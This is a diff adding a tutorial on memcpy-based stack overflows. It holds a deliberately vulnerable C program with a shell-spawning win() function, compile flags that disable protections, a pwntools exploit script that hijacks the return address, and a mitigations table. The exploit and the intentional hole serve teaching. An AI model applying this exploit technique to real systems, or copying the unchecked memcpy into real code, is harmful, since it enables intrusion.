@@ -1,1 +1,119 @@
+An uncontrolled boundary write happens when a program accepts user input via functions like strcpy(), memcpy(), or gets() without verifying or limiting the size of the incoming data relative to the destination buffer.
+While gets() inherently lacks bounds-checking, functions like strcpy() and memcpy() become dangerous when they rely on sizes or string lengths provided directly by untrusted input, or when developer calculations are flawed.
+Here is a step-by-step example highlighting how an uncontrolled memcpy() allows an attacker to control the write size, followed by a Python 3 mitigation testing script using pwntools.
+
+1. The Vulnerable C Program (memcpy_vuln.c)
+
+In this scenario, the application acts as a network packet processor. It reads a structured header containing a length field followed by raw data. If the application trustingly passes this user-supplied length directly to memcpy(), a stack overflow occurs.
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void win() {
+    printf("[+] Target achieved! Opening shell...\n");
+    system("/bin/sh");
+}
+
+void process_packet() {
+    unsigned int payload_length;
+    char local_buffer[64];
+
+    // Read the user-supplied length first
+    printf("Enter payload length: ");
+    if (scanf("%u", &payload_length) != 1) {
+        return;
+    }
+    
+    // Clear the stdin buffer newline
+    getchar(); 
+
+    printf("Enter payload data: ");
+    // VULNERABILITY: memcpy trusts the user-supplied 'payload_length' 
+    // instead of checking if it fits within the 64-byte local_buffer.
+    char temp_input[512];
+    int bytes_read = read(0, temp_input, 512);
+
+    memcpy(local_buffer, temp_input, payload_length);
+    printf("[*] Packet processed successfully.\n");
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    process_packet();
+    return 0;
+}
+Use code with caution.
+
+Compilation Flag Note
+
+To analyze the mechanics of the overflow cleanly without compilation optimizations interfering, compile with stack protections off:
+bash
+gcc -m32 -fno-stack-protector -no-pie memcpy_vuln.c -o memcpy_vuln
+Use code with caution.
+
+2. The Exploit Mechanics
+
+When targeting uncontrolled boundary functions, the exploitation lifecycle depends on fulfilling two specific conditions:
+1. The Size Injection: We instruct the program to copy more bytes than the buffer can hold. In this example, we supply a length value large enough to overwrite the return address (e.g., 80).
+2. The Buffer Layout Alignment: We supply the structured payload matching that exact length.
+text
+       Top of Stack (Lower Memory Address)
+       +------------------------------------+
+
+       |   local_buffer (64 bytes)          |  <-- Copied via memcpy
+       +------------------------------------+
+
+       |   Compiler Alignment (12 bytes)    |  <-- Overwritten with 'A's
+       +------------------------------------+
+
+       |   Saved EBP (4 bytes)              |  <-- Overwritten with 'A's
+       +------------------------------------+
+
+       |   Return Address (4 bytes)         |  <-- Overwritten with win()
+       +------------------------------------+
+       Bottom of Stack (Higher Memory Address)
+Use code with caution.
+
+3. The Python Interaction Script (memcpy_exploit.py)
+
+This script handles the dual-input structure required by the application: first sending the large size attribute, then delivering the aligned binary payload.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Initialize process
+io = process('./memcpy_vuln')
+
+# Static address of win() found via static analysis (e.g., objdump -d ./memcpy_vuln)
+win_address = p32(0x080491b6)
+
+# Total bytes to reach the return address
+# 64 (buffer) + 12 (compiler padding) + 4 (Saved EBP) = 80 bytes
+offset = 80
+
+# 1. Send the custom length that satisfies the overflow target
+io.recvuntil(b"Enter payload length: ")
+io.sendline(str(offset + 4).encode()) # 80 bytes padding + 4 bytes address = 84 total
+
+# 2. Construct the aligned overflow payload
+payload = b"A" * offset + win_address
+
+# 3. Send the raw payload data
+io.recvuntil(b"Enter payload data: ")
+io.sendline(payload)
+
+# Interact with the hijacked flow
+io.interactive()
+Use code with caution.
+
+4. Safer Alternatives and Mitigations
+
+Defending against uncontrolled boundary writes involves substituting dangerous, length-agnostic APIs with bounded alternatives:
+
+Vulnerable Function	Secure Alternative	Reason
+gets(buffer)	fgets(buffer, sizeof(buffer), stdin)	fgets forces a hard limit on maximum characters read.
+strcpy(dest, src)	strlcpy(dest, src, sizeof(dest))	strlcpy guarantees null-termination and respects destination boundaries.
+memcpy(dest, src, size)	Check bounds manually first: if (size <= sizeof(dest))	memcpy is safe only if the size variable is rigorously validated against the destination buffer.
 
